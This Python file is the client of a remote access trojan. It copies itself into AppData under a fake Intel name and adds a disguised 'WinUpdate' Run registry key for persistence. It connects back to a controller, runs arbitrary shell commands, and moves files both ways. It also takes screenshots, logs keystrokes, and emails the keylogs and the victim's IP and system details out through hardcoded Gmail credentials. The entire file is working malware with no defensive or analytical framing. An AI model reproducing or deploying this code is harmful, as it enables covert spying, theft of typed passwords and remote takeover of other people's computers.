import subprocess
import os
import requests
import time
import socket
import shutil
import json
import sys
import pyscreeze
import platform
import ctypes
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.application import MIMEApplication
import smtplib
from io import BytesIO
from cryptography.fernet import Fernet
from pynput.keyboard import Key, Listener
import re

HOST = "192.168.1.34"
PORT = 6666
BUFF = 1024


def becomePersistent():
    evilFileLoc = os.environ["appdata"] + "\\IntelWin32.exe"
    if not os.path.exists(evilFileLoc):
        shutil.copyfile(sys.executable, evilFileLoc)
        regeditCommand = f"reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v WinUpdate /t REG_SZ /d {evilFileLoc}"
        subprocess.call(regeditCommand, shell=True)


def connect():
    global objSocket, objEncryptor
    while True:
        try:
            objSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            objSocket.connect((HOST, PORT))
        except socket.error:
            time.sleep(5)
        else:
            break


def sendClientInfo():
    global objEncryptor, objSocket
    arrClientInfo = [socket.gethostname()]
    strPlatform = f"{platform.system()} {platform.release()}"
    arrClientInfo.extend([strPlatform, os.environ["USERNAME"]])

    objSocket.send(json.dumps(arrClientInfo).encode())
    objEncryptor = Fernet(objSocket.recv(BUFF))


def recv(buffer): return objEncryptor.decrypt(objSocket.recv(buffer))
def send(data): return objSocket.send(objEncryptor.encrypt(data))


def sendall(data):
    bytEncryptedData = objEncryptor.encrypt(data)
    intDataSize = len(bytEncryptedData)
    send(str(intDataSize).encode())
    time.sleep(0.2)
    objSocket.send(bytEncryptedData)


def recvall(buffer):
    bytData = b""
    while len(bytData) < buffer:
        bytData += objSocket.recv(buffer)
    return objEncryptor.decrypt(bytData)


def download(data):  # from server
    intBuffer = int(data)
    fileData = recvall(intBuffer)
    strOutputFile = recv(BUFF).decode()
    print(strOutputFile)
    try:
        with open(strOutputFile, "wb") as objFile:
            objFile.write(fileData)
        response = "[+] Done!".encode()
    except Exception as e:
        print(e)
        response = "[-] Path is protected/invalid!".encode()
    return response


def upload(data):  # to server
    response = b""
    if not os.path.isfile(data):
        response = b"[-] Target file not found!"
    else:
        with open(data, "rb") as objFile:
            response = (objFile.read())  # Send Contents of File
    return response


def screenshot():
    img = pyscreeze.screenshot()
    with BytesIO() as objBytes:
        # Save Screenshot into BytesIO Object
        img.save(objBytes, format="PNG")
        # Get BytesIO Object Data as fbytes
        ss = objBytes.getvalue()

    return ss


def mailConfig(mail="csuonereal@gmail.com"):
    host = "smtp.gmail.com"
    port = 465
    val = smtplib.SMTP_SSL(host, port)
    val.login("2204cmp2204@gmail.com", "cmp2204.")

    msg = MIMEMultipart()
    msg["Subject"] = "Client Info"
    msg["From"] = "2204cmp2204@gmail.com"
    msg["To"] = mail

    values = []
    values.append(val)
    values.append(msg)
    return values


timeIter = 20  # 20secs
count = 0
keys = []
currentTime = time.time()
stoppingTime = 0
regex = r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b'


def sendInfoAsMail(emailAddr):
    if emailAddr == "" or not re.fullmatch(regex, emailAddr):
        return b"[-] Invalid email address!"
    try:
        mail = mailConfig(emailAddr)
        publicIPRes = requests.get("https://api.ipify.org?format=json")
        publicIP = publicIPRes.json()["ip"]
        processor = platform.processor()
        sysInfo = platform.system() + " "+platform.version()
        hostName = socket.gethostname()
        privateIP = socket.gethostbyname(hostName)
        txt = MIMEText("""
                                PUBLIC IP: {0}
                                PROCESSOR: {1}
                                SYSTEM:    {2}
                                HOST NAME: {3}
                                PRIVATE IP:{4}
                               """.format(publicIP, processor, sysInfo, hostName, privateIP))
        mail[1].attach(txt)
        _file = MIMEApplication(screenshot(), _subtype="png")
        _file.add_header("Content-Disposition",
                         "attachment", filename="info.png")
        mail[1].attach(_file)
        mail[0].send_message(mail[1])
        mail[0].quit()
        return b"[+] Success!"
    except Exception as e:
        return f"[-] Error! {e}".encode()


def sendKeylogsAsMail():
    if not os.path.isfile("logger.txt"):
        f = open("logger.txt", "w")
    mail = mailConfig()
    txt = MIMEText("Log Message")
    mail[1].attach(txt)
    with open("logger.txt", "rb") as f:
        _file = MIMEApplication(f.read(), _subtype="txt")
    _file.add_header('Content-Disposition',
                     'attachment', filename="logger.txt")
    mail[1].attach(_file)
    mail[0].send_message(mail[1])
    mail[0].quit()


def keylogger():
    def onPress(key):
        global currentTime, count, keys
        print(key)
        keys.append(key)
        count += 1
        currentTime = time.time()
        if count >= 1:
            count = 0
            writeFile(keys)
            keys = []

    def writeFile(keys):
        with open("logger.txt", "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write('\n')
                    f.close()
                elif k.find("Key") == -1:
                    f.write(k)
                    f.close()

    def onRelease(key):
        global currentTime, stoppingTime
        if key == Key.esc:
            return False
        if currentTime > stoppingTime:
            return False

    global currentTime, stoppingTime, timeIter
    while True:
        with Listener(on_press=onPress, on_release=onRelease) as listener:
            listener.join()
        sendKeylogsAsMail()
        send(b"[+] Give an order(start/stop).")
        order = recv(BUFF).decode()
        print(order)
        if order == "stop":
            break
        elif order == "continue" or order == "start":
            if currentTime > stoppingTime:
                with open("logger.txt", 'w') as f:
                    f.write(" ")
                currentTime = time.time()
                stoppingTime = currentTime + timeIter


def run():
    while True:
        strCurrentDir = os.getcwd()
        order = recv(BUFF).decode()
        print(order)
        bytResponse = b""
        if order == "whereami":
            os.chdir(strCurrentDir)
            bytResponse = f"\n{os.getcwd()}>".encode()
        elif order == "exit" or order == "quit":
            send("[+] Process is being terminated...")
            time.sleep(3)
            objSocket.close()
        elif order[:2] == "cd":
            if os.path.exists(order[3:]):
                os.chdir(order[3:])
                bytResponse = f"[+] Changing working directory to {os.getcwd()}>".encode(
                )
            else:
                bytResponse = "[-] Path not found!".encode()

        elif order[:4] == "send":
            bytResponse = download(order[4:])
        elif order[:4] == "recv":
            bytResponse = upload(order[4:])
        elif order == "screenshot":
            bytResponse = screenshot()
        elif order[:4] == "mail":
            bytResponse = sendInfoAsMail(order[5:])
        elif order == "keylogger":
            keylogger()
        elif len(order) > 0:
            objCommand = subprocess.Popen(
                order, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
            strOutput = objCommand.stdout.read() + objCommand.stderr.read()
            bytResponse = strOutput

        else:
            bytResponse = b"[-] Error!"

        if not order == "keylogger":
            sendall(bytResponse)


def main():
    connect()
    sendClientInfo()
    run()


main()
